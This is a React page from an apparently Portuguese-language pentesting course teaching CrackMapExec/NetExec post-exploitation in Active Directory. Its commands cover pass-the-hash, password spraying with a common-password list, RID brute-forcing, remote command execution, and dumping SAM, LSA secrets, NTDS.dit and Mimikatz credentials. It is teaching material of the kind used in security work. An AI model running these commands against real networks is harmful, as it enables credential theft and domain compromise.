import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function CrackMapExec() {
  return (
    <PageContainer
      title="CrackMapExec / NetExec — Pós-Exploração em Active Directory"
      subtitle="Domine CrackMapExec (CME/NetExec) para movimentação lateral em redes Windows. Inclui autenticação com hashes, spray de senhas, execução remota, dump de credenciais, e enumeração de Active Directory."
      difficulty="avancado"
      timeToRead="35 min"
    >
      <h2>O que é CrackMapExec (NetExec)?</h2>
      <p>
        <strong>CrackMapExec</strong> (rebatizado como <strong>NetExec</strong>) é uma ferramenta de
        pós-exploração para redes Windows/Active Directory. Ela permite testar credenciais em massa,
        executar comandos remotamente, extrair hashes, e movimentar-se lateralmente na rede — tudo
        via protocolos nativos do Windows (SMB, WinRM, LDAP, MSSQL, RDP, SSH).
      </p>

      <AlertBox type="warning" title="Ferramenta de pós-exploração">
        CME é usada DEPOIS de obter pelo menos uma credencial válida (usuário, hash, ou ticket Kerberos).
        É a ferramenta principal para testar "até onde essa credencial leva?" na rede.
      </AlertBox>

      <h2>Instalação e Sintaxe Básica</h2>
      <CodeBlock
        title="Instalar e entender a estrutura de comandos"
        code={`# ═══════════════════════════════════════════════════
# INSTALAR
# ═══════════════════════════════════════════════════
# No Kali (já pode estar instalado):
sudo apt install crackmapexec
# Ou a versão mais nova (NetExec):
pip install netexec

# ═══════════════════════════════════════════════════
# ESTRUTURA DO COMANDO
# ═══════════════════════════════════════════════════
# crackmapexec PROTOCOLO ALVO [AUTENTICAÇÃO] [AÇÃO]
#
# PROTOCOLO: smb, winrm, ldap, mssql, rdp, ssh
# ALVO: IP, range CIDR, lista de IPs
# AUTENTICAÇÃO: -u user -p senha (ou -H hash)
# AÇÃO: --shares, --sam, --lsa, -x comando, etc.

# Exemplos de alvo:
crackmapexec smb 192.168.1.100           # IP único
crackmapexec smb 192.168.1.0/24          # Range CIDR
crackmapexec smb 192.168.1.100-200       # Range de IPs
crackmapexec smb targets.txt             # Arquivo com IPs

# ═══════════════════════════════════════════════════
# PROTOCOLOS E PORTAS
# ═══════════════════════════════════════════════════
# smb   — porta 445 (compartilhamentos, SAM, LSA)
# winrm — porta 5985/5986 (PowerShell remoto)
# ldap  — porta 389/636 (Active Directory queries)
# mssql — porta 1433 (SQL Server)
# rdp   — porta 3389 (Remote Desktop)
# ssh   — porta 22 (Linux/switches)`}
      />

      <h2>Autenticação — Todas as Formas</h2>
      <CodeBlock
        title="Autenticar com senha, hash NTLM, e Kerberos"
        code={`# ═══════════════════════════════════════════════════
# AUTENTICAÇÃO COM SENHA
# ═══════════════════════════════════════════════════
crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!'
# Output:
# SMB  192.168.1.100  445  DC01  [*] Windows Server 2019 (domain:EMPRESA)
# SMB  192.168.1.100  445  DC01  [+] EMPRESA\\admin:P@ssw0rd! (Pwn3d!)
#                                                             ^^^^^^^^
# "(Pwn3d!)" significa que o usuário tem ADMIN LOCAL no host!
# Se não aparecer → autenticação válida mas sem admin local.

# ═══════════════════════════════════════════════════
# AUTENTICAÇÃO COM HASH NTLM (Pass-the-Hash)
# ═══════════════════════════════════════════════════
# Se você tem o hash NTLM (obtido via Mimikatz, SAM dump, etc.):
crackmapexec smb 192.168.1.100 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4'
# -H = hash no formato LM:NT
# O hash LM geralmente é aad3b435... (vazio)
# O hash NT é o que importa

# Também aceita apenas o hash NT:
crackmapexec smb 192.168.1.100 -u admin -H '32ed87bdb5fdc5e9cba88547376818d4'

# ═══════════════════════════════════════════════════
# AUTENTICAÇÃO KERBEROS
# ═══════════════════════════════════════════════════
# Se tem ticket Kerberos (.ccache):
export KRB5CCNAME=/tmp/admin.ccache
crackmapexec smb dc01.empresa.local -k --use-kcache
# -k = usar Kerberos
# --use-kcache = usar ticket do KRB5CCNAME
# Não precisa de senha ou hash!

# ═══════════════════════════════════════════════════
# TESTAR CREDENCIAIS EM VÁRIOS HOSTS
# ═══════════════════════════════════════════════════
# Mesma credencial em toda a rede:
crackmapexec smb 192.168.1.0/24 -u admin -p 'P@ssw0rd!'
# Resultado para cada host:
# [+] = credencial válida
# [-] = credencial inválida
# (Pwn3d!) = admin local no host

# ═══════════════════════════════════════════════════
# INTERPRETANDO OS RESULTADOS
# ═══════════════════════════════════════════════════
# [+] EMPRESA\\admin:P@ssw0rd! → login válido, sem admin
# [+] EMPRESA\\admin:P@ssw0rd! (Pwn3d!) → ADMIN LOCAL!
# [-] EMPRESA\\admin:P@ssw0rd! STATUS_LOGON_FAILURE → senha errada
# [-] EMPRESA\\admin:P@ssw0rd! STATUS_ACCOUNT_LOCKED_OUT → conta bloqueada!
# [-] EMPRESA\\admin:P@ssw0rd! STATUS_ACCOUNT_DISABLED → conta desabilitada
# [-] EMPRESA\\admin:P@ssw0rd! STATUS_PASSWORD_EXPIRED → senha expirada`}
      />

      <h2>Password Spraying</h2>
      <CodeBlock
        title="Testar senhas comuns contra muitos usuários"
        code={`# ═══════════════════════════════════════════════════
# O QUE É PASSWORD SPRAYING
# ═══════════════════════════════════════════════════
# Em vez de testar MUITAS senhas contra UM usuário (bruteforce),
# spray testa UMA senha contra MUITOS usuários.
# → Evita lockout de conta (geralmente 3-5 tentativas)!

# ═══════════════════════════════════════════════════
# PASSO 1: Obter lista de usuários
# ═══════════════════════════════════════════════════
# Via LDAP (se tiver qualquer credencial):
crackmapexec ldap dc01.empresa.local -u user -p 'senha' --users
# Lista TODOS os usuários do domínio com detalhes

# Via SMB (enumerar sem credencial — nem sempre funciona):
crackmapexec smb dc01.empresa.local --users
# Pode funcionar se RID cycling estiver habilitado

# Via RID bruteforce:
crackmapexec smb dc01.empresa.local -u '' -p '' --rid-brute 5000
# --rid-brute 5000 = testar RIDs de 500 a 5000
# RID 500 = Administrator (sempre existe!)
# RID 501 = Guest
# RID 1001+ = usuários normais

# ═══════════════════════════════════════════════════
# PASSO 2: Password Spray
# ═══════════════════════════════════════════════════
# Uma senha contra todos os usuários:
crackmapexec smb dc01.empresa.local \\
  -u users.txt \\
  -p 'Empresa2024!'
# users.txt = lista com um usuário por linha
# Testa "Empresa2024!" em CADA usuário

# Múltiplas senhas (cuidado com lockout!):
crackmapexec smb dc01.empresa.local \\
  -u users.txt \\
  -p passwords.txt \\
  --no-bruteforce
# --no-bruteforce = testa user1:pass1, user2:pass2 (pareado)
# SEM --no-bruteforce = testa TODAS combinações (perigoso!)

# Senhas comuns para spray:
# Empresa2024!
# Empresa@2024
# Welcome1
# Winter2024!
# Summer2024!
# P@ssw0rd
# Senha123
# [NomeEmpresa][Ano]!

# ═══════════════════════════════════════════════════
# PASSO 3: Continuar após encontrar credencial
# ═══════════════════════════════════════════════════
# Se spray encontrar [+] EMPRESA\\joao:Empresa2024!
# Usar essa credencial para enumerar MAIS:
crackmapexec smb 192.168.1.0/24 -u joao -p 'Empresa2024!'
# Ver em quantos hosts o joão tem admin local`}
      />

      <h2>Enumeração de Rede e AD</h2>
      <CodeBlock
        title="Enumerar shares, usuários, grupos e políticas"
        code={`# ═══════════════════════════════════════════════════
# ENUMERAR COMPARTILHAMENTOS (SMB SHARES)
# ═══════════════════════════════════════════════════
crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' --shares
# Output:
# Share      Permissions  Remark
# -----      -----------  ------
# ADMIN$     READ,WRITE   Remote Admin    ← Share admin (C:\\Windows)
# C$         READ,WRITE   Default share   ← Raiz do C:
# IPC$       READ         Remote IPC
# NETLOGON   READ         Logon server share
# SYSVOL     READ         Logon server share
# Backup     READ         ← Compartilhamento customizado!
# Financeiro READ,WRITE   ← Dados sensíveis?

# Pesquisar DENTRO dos shares:
crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' \\
  --spider Backup --regex "password|senha|credential|config"
# --spider = navegar recursivamente o share
# --regex = filtrar por padrão
# Encontra arquivos como: credenciais.txt, .env, config.xml

# ═══════════════════════════════════════════════════
# ENUMERAR ACTIVE DIRECTORY VIA LDAP
# ═══════════════════════════════════════════════════
# Listar usuários do domínio:
crackmapexec ldap dc01.empresa.local -u admin -p 'P@ssw0rd!' --users

# Listar grupos:
crackmapexec ldap dc01.empresa.local -u admin -p 'P@ssw0rd!' --groups

# Encontrar Domain Admins:
crackmapexec ldap dc01.empresa.local -u admin -p 'P@ssw0rd!' \\
  --groups "Domain Admins"

# Listar computadores do domínio:
crackmapexec ldap dc01.empresa.local -u admin -p 'P@ssw0rd!' --computers

# Obter política de senha (para calibrar spray):
crackmapexec smb dc01.empresa.local -u admin -p 'P@ssw0rd!' --pass-pol
# Output:
# Minimum password length: 8
# Password history length: 24
# Maximum password age: 42 days
# Account lockout threshold: 5      ← IMPORTANTE!
# Account lockout duration: 30 min
# ↑ Após 5 tentativas erradas → conta bloqueada por 30 min
# → No spray, testar no máximo 2-3 senhas por ciclo!

# ═══════════════════════════════════════════════════
# ENCONTRAR CONTAS COM DADOS SENSÍVEIS
# ═══════════════════════════════════════════════════
# Contas com "senha nunca expira":
crackmapexec ldap dc01.empresa.local -u admin -p 'P@ssw0rd!' \\
  --trusted-for-delegation
# Contas com delegação → potencial para Kerberos attacks!

# Descrições de usuários (podem conter senhas!):
crackmapexec ldap dc01.empresa.local -u admin -p 'P@ssw0rd!' \\
  --users | grep -i "pass\\|senha\\|pwd"`}
      />

      <h2>Execução Remota e Dump de Credenciais</h2>
      <CodeBlock
        title="Executar comandos e extrair hashes"
        code={`# ═══════════════════════════════════════════════════
# EXECUTAR COMANDOS REMOTAMENTE
# ═══════════════════════════════════════════════════
# REQUER admin local (Pwn3d!)

# Via SMB (execução com cmd.exe):
crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' -x 'whoami'
# -x = executar comando via cmd.exe
# Output: empresa\\admin

crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' -x 'ipconfig /all'
crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' -x 'net user /domain'

# Via PowerShell (-X maiúsculo):
crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' -X 'Get-Process'
# -X = executar via PowerShell (mais poderoso que cmd)

# Via WinRM (PowerShell remoting — mais limpo):
crackmapexec winrm 192.168.1.100 -u admin -p 'P@ssw0rd!' -x 'whoami'

# Executar em TODOS os hosts da rede:
crackmapexec smb 192.168.1.0/24 -u admin -p 'P@ssw0rd!' -x 'hostname'
# Executa "hostname" em cada host onde admin tem acesso!

# ═══════════════════════════════════════════════════
# DUMP DE SAM (hashes locais)
# ═══════════════════════════════════════════════════
crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' --sam
# --sam = dump do banco SAM (Security Account Manager)
# SAM contém hashes de TODOS os usuários LOCAIS do host
# Output:
# Administrator:500:aad3...:32ed87bdb5fdc5e9cba88547376818d4:::
# DefaultAccount:503:aad3...:31d6cfe0d16ae931b73c59d7e0c089c0:::
# ↑ username:RID:LM_hash:NT_hash
# O NT_hash pode ser usado para Pass-the-Hash!

# ═══════════════════════════════════════════════════
# DUMP DE LSA SECRETS
# ═══════════════════════════════════════════════════
crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' --lsa
# --lsa = dump dos LSA Secrets
# LSA pode conter:
# - Senhas de contas de serviço em texto claro!
# - Senhas de auto-logon
# - Credenciais de VPN
# - Chaves de criptografia

# ═══════════════════════════════════════════════════
# DUMP DE NTDS.DIT (TODOS os hashes do domínio!)
# ═══════════════════════════════════════════════════
# REQUER admin no Domain Controller!
crackmapexec smb dc01.empresa.local -u domainadmin -p 'P@ssw0rd!' --ntds
# --ntds = dump do NTDS.dit (banco do Active Directory)
# Contém hash de TODOS os usuários do domínio!
# Output: MILHARES de linhas:
# EMPRESA\\Administrator:500:aad3...:hash_nt:::
# EMPRESA\\joao:1001:aad3...:hash_nt:::
# EMPRESA\\maria:1002:aad3...:hash_nt:::
# ...
# Com esses hashes, pode fazer Pass-the-Hash em qualquer conta!

# Filtrar apenas Domain Admins:
crackmapexec smb dc01.empresa.local -u domainadmin -p 'P@ssw0rd!' \\
  --ntds --user Administrator
# --user = filtrar por usuário específico

# ═══════════════════════════════════════════════════
# MIMIKATZ VIA CME
# ═══════════════════════════════════════════════════
# Executar Mimikatz remotamente:
crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd!' \\
  -M mimikatz
# Módulo que injeta Mimikatz e extrai credenciais
# Pode retornar senhas em TEXTO CLARO da memória!`}
      />
    </PageContainer>
  );
}
